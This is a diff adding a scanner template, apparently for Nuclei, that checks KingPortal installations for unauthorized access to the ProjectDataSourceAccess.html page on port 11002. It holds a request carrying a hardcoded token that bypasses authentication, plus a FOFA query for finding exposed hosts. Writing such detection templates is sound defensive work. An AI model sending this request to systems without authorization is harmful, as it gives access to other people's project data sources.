@@ -1,0 +1,31 @@
+id: kingportal-datasource-unauth
+
+info:
+  name: KingPortal ProjectDataSourceAccess.html - Unauthorized Access
+  author: qwtd
+  severity: high
+  description: |
+    KingPortal port 11002 ProjectDataSourceAccess.html page Unauthorized Access.
+  reference:
+    - https://mp.weixin.qq.com/s/fYnLnoeHvYFwaSSKfBjQZw
+  metadata:
+    fofa: title="KingPortal"
+    verified: true
+  tags: KingPortal
+
+http:
+  - method: GET
+    path:
+      - "{{Scheme}}://{{Host}}:11002/views/ProjectDataSourceAccess.html?token=2ccdf191078bd4e8e85b526ec44f7dd31ad7cf81&amp;refreshToken=null"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "ProjectDataSourceAccess.js"
+          - "当前工程节点"
+        condition: and
+
+      - type: status
+        status:
+          - 200
